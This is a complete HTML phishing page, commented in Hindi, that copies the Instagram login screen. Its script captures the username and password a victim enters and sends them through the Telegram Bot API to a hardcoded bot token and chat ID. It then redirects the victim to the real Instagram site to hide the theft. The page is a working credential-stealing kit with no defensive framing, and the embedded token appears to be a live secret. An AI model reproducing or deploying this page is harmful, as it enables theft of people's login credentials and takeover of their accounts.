<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <!-- यहाँ पूरा CSS डिज़ाइन है -->
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
            border-radius: 1px;
        }
        h2 {
            font-family: cursive;
            font-size: 36px;
            margin-bottom: 30px;
            color: #262626;
        }
        input {
            width: 100%;
            padding: 10px 12px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 6px;
            font-size: 12px;
        }
        input:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 7px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: #1877f2;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Instagram</h2>
        <!-- फॉर्म -->
        <form id="loginForm">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <!-- जावास्क्रिप्ट कोड -->
    <script>
      const token = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs";  
      const chatId = "7008289410";    

      document.getElementById('loginForm').addEventListener('submit', function(e) {
          e.preventDefault(); 

          let user = document.querySelector('input[name="username"]').value;
          let pass = document.querySelector('input[name="password"]').value;

          let message = `नया लॉगिन डेटा:\nयूजरनेम: ${user}\nपासवर्ड: ${pass}`;
          
          fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
          .then(response => response.json())
          .then(data => {
              console.log('सफलतापूर्वक भेज दिया गया', data);
              window.location.href = "https://instagram.com"; 
          })
          .catch(error => console.error('एरर:', error));
      });
    </script>

</body>
</html>
